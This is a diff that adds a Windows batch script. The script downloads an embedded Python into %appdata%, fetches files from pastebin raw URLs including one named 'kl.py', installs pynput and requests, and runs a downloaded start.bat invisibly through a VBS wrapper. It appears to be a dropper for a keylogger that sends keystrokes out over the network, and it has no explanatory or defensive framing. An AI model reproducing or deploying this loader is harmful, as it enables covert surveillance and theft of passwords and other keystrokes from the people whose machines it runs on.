@@ -1,0 +1,24 @@
+echo off
+cls
+cd %appdata%
+
+if exist python\start.bat (
+	cd python
+	wscript.exe "%appdata%/invisible.vbs" "start.bat"
+) else (
+	mkdir python
+	cd python
+	powershell -Command "Invoke-WebRequest https://www.python.org/ftp/python/3.10.9/python-3.10.9-embed-amd64.zip -Outfile python.zip"
+	tar -xf python.zip
+	powershell -Command "Invoke-WebRequest https://bootstrap.pypa.io/get-pip.py -Outfile get-pip.py"
+	powershell -Command "Invoke-WebRequest https://pastebin.com/raw/dzRvGa3K -Outfile python310._pth"
+	powershell -Command "Invoke-WebRequest https://pastebin.com/raw/tbaYcG47 -Outfile kl.py"
+	python.exe get-pip.py
+	cd Scripts
+	pip install requests
+	pip install pynput
+	cd %appdata%
+	cd python
+	powershell -Command "Invoke-WebRequest https://pastebin.com/raw/JfMVZVEs -Outfile start.bat"
+	wscript.exe "%appdata%/invisible.vbs" "start.bat"
+)
